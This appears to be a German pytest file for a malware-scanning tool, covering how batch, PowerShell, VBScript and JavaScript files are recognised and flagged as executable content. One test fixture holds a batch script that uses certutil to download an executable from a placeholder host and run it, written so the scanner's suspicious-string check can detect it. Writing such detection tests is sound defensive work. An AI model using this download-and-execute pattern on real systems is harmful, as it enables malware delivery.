"""Skript-Typisierung: .bat & Co. sind ausführbarer Inhalt, kein „Text".

Feld-Report: eine .bat wurde als Typ „Text" angezeigt. Skripte haben keine
Magic Bytes — die Endung verfeinert den erkannten Klartext-Typ zum konkreten
Skript-Dialekt, und die Pipeline ergänzt das fehlende Framing
(„ausführbarer Inhalt"). Die Muster-Heuristiken (LOLBins, PS-encoded,
Download-Cradles) laufen darüber hinaus bereits über die Content-Checks.
"""

import os
import tempfile

import pytest

from malaz.analysis.clamav import ClamAVScanner
from malaz.analysis.windows_av import WindowsDefenderScanner
from malaz.core.dispatcher import Dispatcher
from malaz.core.magic import (
    detect,
    expected_type_for_extension,
    refine_script_content,
    refine_text_type,
)
from malaz.models import RiskLevel, Severity
from malaz.pipelines.generic_pipeline import GenericPipeline


@pytest.fixture()
def dispatcher():
    return Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )


def _scan(dispatcher, data: bytes, suffix: str):
    fd, path = tempfile.mkstemp(suffix=suffix)
    os.write(fd, data)
    os.close(fd)
    try:
        return dispatcher.scan_path(path)
    finally:
        os.unlink(path)


# -- Typ-Verfeinerung -------------------------------------------------------- #

def test_refine_text_to_script_types():
    assert refine_text_type(detect(b"@echo off\r\n"), ".bat").type == "batch"
    assert refine_text_type(detect(b"Get-Process\r\n"), ".ps1").type == "ps1"
    assert refine_text_type(detect(b"Dim x\r\n"), ".vbs").type == "vbs"
    assert refine_text_type(detect(b"var x = 1;\r\n"), ".js").type == "js"


def test_refine_json_body_in_js_file():
    """Valider JSON-Inhalt in einer .js ist kein Format-Täuschungs-Fall."""
    refined = refine_text_type(detect(b'{"a": 1}'), ".js")
    assert refined.type == "js"


def test_refine_leaves_non_script_types_alone():
    assert refine_text_type(detect(b"hallo welt\n"), ".txt").type == "text"
    # Binärerkennung schlägt die Endung: ein echtes PE bleibt PE.
    pe = b"MZ" + os.urandom(200)
    assert refine_text_type(detect(pe), ".bat").type == "pe"


def test_extension_map_consistent_with_script_types():
    assert expected_type_for_extension(".bat") == "batch"
    assert expected_type_for_extension(".ps1") == "ps1"
    assert expected_type_for_extension(".vbs") == "vbs"
    assert expected_type_for_extension(".js") == "js"


# -- Inhalts-Erkennung (Stufe 2, libmagic-Stil) ------------------------------ #

def test_renamed_batch_detected_by_content(dispatcher):
    """Eine als .txt getarnte Batch-Datei darf nicht als 'Text' durchgehen."""
    r = _scan(dispatcher, b"@echo off\r\necho Hallo\r\n", ".txt")
    assert r.detected_type == "batch"
    assert any(i.rule_id == "SCRIPT_EXECUTABLE" for i in r.indicators)


def test_content_refine_powershell_and_vbs():
    ps_body = b"$x = Get-Content C:\\a.txt\r\nWrite-Host $x\r\n"
    assert refine_script_content(detect(ps_body), ps_body).type == "ps1"
    vbs_body = b"Dim x\r\nSet y = CreateObject(\"WScript.Shell\")\r\n"
    assert refine_script_content(detect(vbs_body), vbs_body).type == "vbs"


def test_content_refine_utf16_powershell():
    body = "param([string]$p)\r\nWrite-Host $p\r\n".encode("utf-16")
    assert refine_script_content(detect(body), body).type == "ps1"


def test_content_refine_requires_two_distinct_tokens():
    """Prosa, die EINEN Befehl zitiert, bleibt Text (FP-Schutz)."""
    prose = b"Hier steht im Text mal write-host als Zitat.\r\nMehr nicht.\r\n"
    assert refine_script_content(detect(prose), prose).type == "text"


def test_content_refine_never_overrides_other_types():
    pe = b"MZ" + os.urandom(200)
    assert refine_script_content(detect(pe), pe).type == "pe"
    pdf = b"%PDF-1.7\n@echo off\n%%EOF"
    assert refine_script_content(detect(pdf), pdf).type == "pdf"


def test_extension_script_type_wins_over_content():
    body = b"@echo off\r\n"
    js = refine_text_type(detect(body), ".js")
    assert js.type == "js"
    assert refine_script_content(js, body).type == "js"


# -- Pipeline-Framing -------------------------------------------------------- #

def test_benign_bat_is_typed_and_annotated_but_green(dispatcher):
    r = _scan(dispatcher, b"@echo off\r\necho Hallo Welt\r\n", ".bat")
    assert r.detected_type == "batch"
    note = [i for i in r.indicators if i.rule_id == "SCRIPT_EXECUTABLE"]
    assert note and note[0].severity == Severity.INFO
    assert r.risk_level == RiskLevel.GREEN


def test_malicious_bat_scores_via_content_checks(dispatcher):
    bat = (
        b"@echo off\r\n"
        b"certutil -urlcache -split -f http://example.invalid/x.exe C:\\x.exe\r\n"
        b"C:\\x.exe\r\n"
    )
    r = _scan(dispatcher, bat, ".bat")
    assert r.detected_type == "batch"
    assert any(i.rule_id == "GEN_SUSPICIOUS_STRINGS" for i in r.indicators)
    assert r.score >= 15


def test_plain_txt_gets_no_script_note(dispatcher):
    """Klartext ohne Skript-Marker bleibt .txt ohne Skript-Notiz."""
    r = _scan(dispatcher, b"Hallo Welt\r\nzweite Zeile, ganz normale Notiz.\r\n", ".txt")
    assert r.detected_type == "text"
    assert not any(i.rule_id == "SCRIPT_EXECUTABLE" for i in r.all_indicators())


def test_ps1_and_vbs_annotated(dispatcher):
    for suffix, body in (
        (".ps1", b"Write-Host 'x'\r\n"),
        (".vbs", b"WScript.Echo \"x\"\r\n"),
    ):
        r = _scan(dispatcher, body, suffix)
        assert any(
            i.rule_id == "SCRIPT_EXECUTABLE" for i in r.indicators
        ), suffix


def test_note_only_for_script_types():
    from malaz.models import AnalysisContext

    for ftype in ("text", "pe", "pdf", "zip"):
        ctx = AnalysisContext(path="x", data=b"x", detected_type=ftype, size=1)
        assert GenericPipeline()._script_note(ctx) == [], ftype
